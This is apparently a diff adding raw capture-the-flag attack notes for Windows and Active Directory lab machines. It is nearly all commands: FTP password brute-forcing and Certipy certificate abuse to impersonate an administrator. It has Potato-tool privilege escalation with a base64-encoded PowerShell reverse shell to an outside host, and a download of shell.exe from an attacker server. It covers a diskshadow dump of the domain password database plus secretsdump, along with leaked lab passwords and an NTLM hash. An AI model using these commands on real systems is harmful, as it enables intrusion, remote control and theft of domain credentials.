@@ -1,0 +1,131 @@
+
+
+ftp 10.82.130.91 10021
+
+hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ftp://10.82.130.91:10021
+
+
+
+IVY_WILLIS
+SUSANNA_MCKNIGHT
+
+
+ certipy-ad req -u 'SUSANNA_MCKNIGHT@thm.local' -p 'CHANGEME2023!' -ca 'thm-LABYRINTH-CA' -template 'ServerAuth' -upn 'administrator@thm.local' -dc-ip 10.81.178.165 -target labyrinth.thm.local -timeout 30
+ 
+ 
+certipy-ad auth -pfx administrator.pfx -dc-ip 10.81.178.165 -ldap-shell
+# change_password Administrator 'NewPassword123!'
+
+
+
+
+
+
+impacket-lookupsid vulnnet-rst.local/guest@10.66.137.223 > sid_output.txt
+
+grep "SidTypeUser" sid_output.txt | awk -F'\\' '{print $2}' | awk '{print $1}' > valid_users.txt
+
+
+
+SMB         10.80.167.120   445    WIN-2BO8M1OE1M1  NETLOGON        READ            Logon server share
+└─$ smbclient //10.80.167.120/NETLOGON -U 'VULNNET-RST/t-skid%tj072889*'
+
+strUserNTName = "a-whitehat"
+strPassword = "bNdKVkjv3RR9ht"
+
+
+grant prem 
+takeown /f C:\Users\Administrator\Desktop\system.txt
+icacls C:\Users\Administrator\Desktop\system.txt /grant YOUR_USER:F
+
+
+
+
+
+
+ .\PrintSpoofer64.exe -i -c powershell.exe
+ .\GodPotato-NET4.exe -cmd "whoami"
+ 
+
+
+.\GodPotato-NET4.exe -cmd "powershell -e JExIT1NUID0gIjE5Mi4xNjguMTM0LjM1IjsgJExQT1JUID0gNDQ0NTsgJFRDUENsaWVudCA9IE5ldy1PYmplY3QgTmV0LlNvY2tldHMuVENQQ2xpZW50KCRMSE9TVCwgJExQT1JUKTsgJE5ldHdvcmtTdHJlYW0gPSAkVENQQ2xpZW50LkdldFN0cmVhbSgpOyAkU3RyZWFtUmVhZGVyID0gTmV3LU9iamVjdCBJTy5TdHJlYW1SZWFkZXIoJE5ldHdvcmtTdHJlYW0pOyAkU3RyZWFtV3JpdGVyID0gTmV3LU9iamVjdCBJTy5TdHJlYW1Xcml0ZXIoJE5ldHdvcmtTdHJlYW0pOyAkU3RyZWFtV3JpdGVyLkF1dG9GbHVzaCA9ICR0cnVlOyAkQnVmZmVyID0gTmV3LU9iamVjdCBTeXN0ZW0uQnl0ZVtdIDEwMjQ7IHdoaWxlICgkVENQQ2xpZW50LkNvbm5lY3RlZCkgeyB3aGlsZSAoJE5ldHdvcmtTdHJlYW0uRGF0YUF2YWlsYWJsZSkgeyAkUmF3RGF0YSA9ICROZXR3b3JrU3RyZWFtLlJlYWQoJEJ1ZmZlciwgMCwgJEJ1ZmZlci5MZW5ndGgpOyAkQ29kZSA9IChbdGV4dC5lbmNvZGluZ106OlVURjgpLkdldFN0cmluZygkQnVmZmVyLCAwLCAkUmF3RGF0YSAtMSkgfTsgaWYgKCRUQ1BDbGllbnQuQ29ubmVjdGVkIC1hbmQgJENvZGUuTGVuZ3RoIC1ndCAxKSB7ICRPdXRwdXQgPSB0cnkgeyBJbnZva2UtRXhwcmVzc2lvbiAoJENvZGUpIDI+JjEgfSBjYXRjaCB7ICRfIH07ICRTdHJlYW1Xcml0ZXIuV3JpdGUoIiRPdXRwdXRgbiIpOyAkQ29kZSA9ICRudWxsIH0gfTsgJFRDUENsaWVudC5DbG9zZSgpOyAkTmV0d29ya1N0cmVhbS5DbG9zZSgpOyAkU3RyZWFtUmVhZGVyLkNsb3NlKCk7ICRTdHJlYW1Xcml0ZXIuQ2xvc2UoKQ=="
+
+
+.\GodPotato-NET4.exe -cmd "cmd /c type C:\Users\Administrator\Desktop\system.txt"
+
+
+
+whoami /priv
+dir 
+
+cd ..
+
+cd temp
+powershell
+ Invoke-WebRequest -Uri http://192.168.134.35:8000/shell.exe -OutFile C:\temp\shell.exe
+ 
+ .bak
+ Zero.exe
+ 
+ powershell -ep bypass 
+ 
+ Import-Module ./PowerUp.ps1
+ Invoke-Allchecks
+ 
+ sc start zerotieroneservice
+ 
+ Stop-Service -name "zerotieroneservice"
+ Start-Service -name "zerotieroneservice"
+ 
+ 
+ 
+ 
+ # IF You are in backp operator group 
+ 
+  cd C:\Windows\Temp
+  echo "add volume c: alias fusion" | Out-File -Append -Encoding ascii backup.txt
+ echo "set metadata c:\windows\temp\meta.cab" | Out-File -Append -Encoding ascii backup.txt
+  echo "add volume c: alias fusion" | Out-File -Append -Encoding ascii backup.txt
+ echo "create" | Out-File -Append -Encoding ascii backup.txt
+ echo "expose %fusion% z:" | Out-File -Append -Encoding ascii backup.txt
+ 
+ or 
+ "set context persistent nowriters`nset metadata c:\windows\temp\meta.cab`nadd volume c: alias fusion`ncreate`nexpose %fusion% z:" | Out-File backup.txt -Encoding ascii
+ 
+or 
+upload backup.txt
+
+Import-Module .\SeBackupPrivilegeUtils.dll
+Import-Module .\SeBackupPrivilegeCmdLets.dll
+
+
+ diskshadow /s backup.txt
+ 
+ robocopy z:\windows\ntds c:\windows\temp ntds.dit /b
+ 
+ 
+ reg save hklm\system c:\windows\temp\system.hive
+ 
+ download ntds.dit
+ 
+ download system.hive
+ 
+ impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL
+ 
+ 
+ 
+ 
+ 
+ 
+twilliams
+roastpotatoes
+
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:1afedc472d0fdfe07cd075d36804efd0:::
+
+SMB         10.81.171.165   445    HAVEN-DC         [-] raz0rblack.thm\sbradley:roastpotatoes STATUS_PASSWORD_MUST_CHANGE
+
+
+changepasswd.py raz0rblack.thm/sbradley:'roastpotatoes'@$IP -newpass 'N3wPassw0rd!'
+
+
+ 
